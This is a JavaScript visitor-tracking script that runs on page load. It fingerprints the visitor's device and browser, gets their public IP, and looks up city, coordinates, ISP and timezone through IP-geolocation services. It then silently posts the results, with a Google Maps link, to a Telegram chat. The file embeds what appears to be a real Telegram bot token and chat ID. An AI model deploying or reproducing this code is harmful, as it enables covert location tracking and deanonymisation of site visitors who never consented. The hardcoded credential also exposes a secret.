// Determine device type
let mach = '';
const userAgent = navigator.userAgent;
if (userAgent.includes('Windows')) {
    mach = 'Windows';
} else if (userAgent.includes('Ubuntu')) {
    mach = 'Ubuntu';
} else if (userAgent.includes('Kali')) {
    mach = 'Kali';
} else if (userAgent.includes('Android')) {
    mach = 'Android';
} else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
    mach = 'iOS';
} else {
    mach = 'Other';
}

// Determine browser type
let nav = '';
if (userAgent.includes('Chrome')) {
    nav = 'Chrome';
} else if (userAgent.includes('Safari')) {
    nav = 'Safari';
} else if (userAgent.includes('Edge')) {
    nav = 'Edge';
} else if (userAgent.includes('Firefox')) {
    nav = 'Mozilla';
} else if (userAgent.includes('Opera')) {
    nav = 'Opera';
} else if (userAgent.includes('Tor')) {
    nav = 'Tor';
} else {
    nav = 'Other';
}

// Get client IP
function get_client_ip(callback) {
    fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => callback(data.ip))
        .catch(error => console.error('Error:', error));
}

// Get geolocation data
function get_location(ip) {
    fetch(`http://ipinfo.io/${ip}/geo`)
        .then(response => response.json())
        .then(json1 => {
            const loc = json1.loc;
            const country = json1.country + ', ' + json1.region + ', ' + json1.city;

            fetch(`http://ip-api.com/json/${ip}?fields=query,continent,country,countryCode,regionName,city,zip,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting`)
                .then(response => response.json())
                .then(json => {
                    const timezone = json.timezone;
                    const zip = json.isp;

                    // Telegram message construction
                    const msg = "-----{===--{ Nevo Info }--===}-----" + "\n\n" + "Your IP : " + ip + "\n\n" + "Your APP & Device : " + mach + '/' + nav + "\n\n" + "Your address : " + country + "\n\n" + "Your Provider : " + zip + "\n\n" + "Your Location : http://www.google.com/maps/place/" + loc + "\n\n" + "Your Time Now Is :" + timezone + "\n\n" + "-----{===--{ Nevo Info }--===}-----";

                    // Telegram API endpoint and data
                    const bot_id = "-1001874783762"; // Your Telegram bot ID
                    const url = 'https://api.telegram.org/bot6122428056:AAGnIMsjHzFpM9taaSTzdvFsJGNaTmvjZCY/sendMessage'; // Replace <YourBotToken> with your actual bot token

                    const data = {
                        chat_id: bot_id,
                        text: msg
                    };

                    const options = {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    };

                    fetch(url, options)
                        .then(response => response.json())
                        .then(result => console.log(result))
                        .catch(error => console.error('Error:', error));
                });
        });
}

// Call functions
get_client_ip(get_location);
